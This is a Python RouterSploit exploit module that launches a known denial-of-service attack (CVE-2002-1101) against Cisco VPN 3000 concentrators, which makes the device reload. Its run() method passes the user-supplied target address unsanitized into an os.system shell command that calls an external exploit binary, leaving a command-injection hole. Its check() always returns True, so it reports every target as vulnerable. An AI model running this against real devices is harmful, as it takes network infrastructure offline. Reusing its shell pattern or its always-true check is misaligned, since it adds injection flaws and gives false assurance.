import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "Cisco_VPN_3000_Series_Concentrator_Client-Authentication_Denial_of_Service",

        "description": "Cisco VPN 3000 series concentrators are prone to a denial of service condition when receiving an overly long username  "
                       " string during authentication from a VPN client.Successful exploitation will cause the device to reload. ",

        "authors": (

            "Phenoelit",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/21770",

        ),

        "devices": (

            "Cisco, CVE-2002-1101"
        ),
    }


    target = OptIP("", "ip address")



    
    def run(self):

        if self.check():
            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "./exploit-db-21770 -d {}".format(self.target)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
